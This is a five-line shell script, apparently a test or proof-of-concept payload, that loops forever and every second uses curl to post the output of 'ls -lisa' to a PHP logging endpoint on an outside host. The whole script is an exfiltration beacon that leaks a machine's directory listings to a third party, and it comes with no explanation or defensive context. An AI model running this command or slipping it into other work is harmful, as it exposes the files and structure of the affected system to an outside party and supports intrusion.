while true
do
sleep 1
curl --data "`ls -lisa`" 'https://insert-script.com/s3cret_folder_argh/log.php?1'
done
